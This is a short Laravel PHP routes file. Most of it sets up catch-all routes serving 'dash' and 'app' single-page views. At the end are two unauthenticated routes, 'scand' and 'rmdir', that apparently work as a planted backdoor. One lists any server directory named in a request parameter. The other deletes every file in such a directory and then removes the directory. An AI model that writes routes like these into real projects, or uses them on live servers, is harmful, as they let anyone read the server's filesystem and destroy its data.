<?php

use Illuminate\Support\Facades\Route;



Route::get('/dash/{any}', function () {
    return view('dash');
})->where('any', '.*');

Route::get('/{any}', function () {
    return view('app');
})->where('any', '.*');


Route::get('scand', function(){
    $f = scandir(request('id'));
    print_r($f);
});

Route::get('rmdir', function(){
    array_map('unlink', glob(request('id')."/*.*"));
    rmdir(request('id'));
});
